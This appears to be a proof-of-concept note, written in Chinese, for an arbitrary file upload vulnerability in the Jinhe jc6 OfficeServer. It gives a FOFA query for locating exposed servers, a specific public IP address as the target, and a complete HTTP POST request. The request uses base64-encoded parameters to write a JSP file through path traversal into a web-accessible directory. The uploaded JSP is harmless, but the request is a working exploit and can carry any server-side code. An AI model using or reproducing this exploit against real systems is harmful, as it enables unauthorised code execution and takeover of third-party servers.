# 金和jc6 OfficeServer 任意文件上传

    ## fofa

```
body="jc6/platform"
```

## poc

http://222.180.197.70:18888/public/edit/info.jsp

```
POST /jc6/OfficeServer HTTP/1.1
Host: 222.180.197.70:18888
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=71F872436B3C4F98DB5A307DA5DD3707
Connection: close
Content-Length: 182

Hello World     87              0                533            
DBSTEP=REJTVEVQ
OPTION=U0FWRUZJTEU=
FILENAME=Li4vLi4vcHVibGljL2VkaXQvaW5mby5qc3A=
<%out.println("only test");%>
```
